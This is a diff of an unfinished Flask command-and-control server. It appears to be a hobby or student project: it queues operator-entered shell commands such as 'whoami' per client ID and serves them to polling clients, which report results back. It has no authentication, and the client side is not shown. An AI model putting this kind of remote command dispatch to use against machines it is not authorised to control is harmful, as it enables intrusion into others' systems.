@@ -1,13 +1,16 @@
 from flask import Flask, request, jsonify, render_template
 import requests
+from datetime import datetime
 
 SERVER_URL = "http://127.0.0.1:5005"
 app = Flask(__name__)
 print("Drew was here")
 
-#TODO: # client check in but only run if cmd changes
+#TODO: 
+# client check in but only run if cmd changes
+# get rid of current_command ):
 
-current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
+# current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
 client_commands = {} # 'client_id': 'command' --> to handle commands for specific clients
 clients = [] # just to see what clients we got rn
 
@@ -19,48 +22,70 @@ def home():
 @app.route('/input-command', methods=['GET', 'POST'])
 def input():
     if request.method == 'POST':
-        global current_command
-        current_command = request.form.get('command')
-        print("!!!!!!!!!!current command:", current_command)
-        return render_template('home.html', message="command received: "+str(current_command)) # i dont like this. NEED a return statement though
+    #     global current_command
+        command_input = request.form.get('command')
+    #     print("!!!!!!!!!!current command:", current_command)
+    #     return render_template('home.html', message="command received: "+str(current_command)) # i dont like this. NEED a return statement though
+    # client_id = request.form.get('client_id', 'all') # default to all if no specific client
+    # timestamp = datetime.now()
+    # if client_id == 'all':
+    #     for c in client_commands:
+    #         client_commands[c] = {"command": command, "timestamp": timestamp}
+    # else:
+    #     client_commands[client_id] = {"command": command, "timestamp": timestamp} # log command w/ timestamp
+    # return render_template('home.html', message="command received: "+str(current_command)) # do something about this
+    try:
+        cmd, client_id = command_input.split(maxsplit=1) # splits it at only first occurrence of whitespace. so fire
+        print("!!!!CLIENT ID: " + client_id)
+        print("!!!!CMD: " + cmd)
+        client_commands[client_id] = {'command': cmd, 'timestamp': datetime.now()}
+    except ValueError:
+        return render_template('home.html', message="invalid input")
+    # client_commands[client_id] = {'command': cmd, 'timestamp': datetime.now()}
+    return render_template('home.html', message=f"Command received for {client_id}: {cmd}")
 
 
-@app.route('/command', methods=['GET'])
+@app.route('/command', methods=['GET']) # CURRENTLY FIXING THIS
 def send_command():
-    global current_command
-    client_id = None # default
+    client_id = request.args.get('client_id') # defaults to None apparently?
+    # client_id = next(reversed(client_commands)) # thank you chatgpt
+    # cmd = client_commands[client_id]['command']
+    cmd = client_commands.get(client_id)
 
     # handle commands to specific clients
     # syntax: [command] [client_id]
-    if len(current_command.split()) > 1: # if command was given w/ client arg
-        # THIS WORKS
-        cmd = current_command.split()[0]
-        print("!!!!!!!!CMD: " + cmd)
-        client_id = current_command.split()[1]
-        print("!!!!!!!!! CLIENT_ID: "+ client_id)
-        client_commands[client_id] = cmd
-        print("!!!!!!!!!!!!!!!!!!   " + client_commands[client_id])
-        # current_command = "whoami"
-    else:
-        # fix this
-        cmd = current_command
-        # current_command = "whoami"
+    # if len(current_command.split()) > 1: # if command was given w/ client arg
+    #     cmd = current_command.split()[0]
+    #     client_id = current_command.split()[1]
+    #     client_commands[client_id] = cmd
+    # else:
+    #     cmd = current_command
+    # client_commands[client_id] = ""
 
-    if client_id in client_commands: # if valid client id was parsed
-        if cmd != client_commands[client_id]: # if not a repeat command
-            return jsonify(status="sent", client_id=client_id, command=cmd) # send to a specific client
+    # print("CLIENT ID ")
+    # print(client_id)
+    if client_id in clients: # if valid client id was parsed
+        print("valid client")
+        cmd_info = client_commands.get(client_id, None)
+        if cmd_info and ((datetime.now() - cmd_info['timestamp']).total_seconds() < 5): # if command is valid and was issued within the last 5 secs
+            print("sup")
+            return jsonify(status="sent", client_id=client_id, command=cmd_info['command']) # send to a specific client
+        else:
+            return jsonify(status="no command", client_id=client_id)
     return jsonify(status="sent", command=cmd) # otherwise send to all
+    #TODO: FIX SEND TO ALL
     # return jsonify(status="unsent", command="") # invalid client_id
 
 @app.route('/register-client', methods=['GET'])
 def register_client():
-    print("register_client function")
-    client_id = request.args.get('client_id')
+    # print("register_client function")
+    client_id = request.args.get('client_id') # retrieves the value associated with the key 'client_id' from the query string, or None if it does not exist
     # client_id = "test"
-    print(client_id)
-    clients.append(client_id)
-    client_commands[client_id] = "whoami"
-    # return jsonify(client_id=client_id, command="hostname -I")
+    # print(client_id)
+    if client_id not in clients:
+        clients.append(client_id)
+    if client_id not in client_commands:
+        client_commands[client_id] = {"command": None, "timestamp": datetime.min}
     return jsonify(status="client registered", client_id=client_id)
 
 
@@ -70,8 +95,8 @@ def command_result():
     # wtf is a result rename that
     status = request.args.get('status')
     print("!!!!!!!!!!client command result:\n" + result)
-    # print(f"client is {status}") # hell yeah maybe put this somewhere else    or take it away altogether cause its in the POST header
     return jsonify({"status": "success"})
+
 
 @app.route('/clients')
 def show_clients():
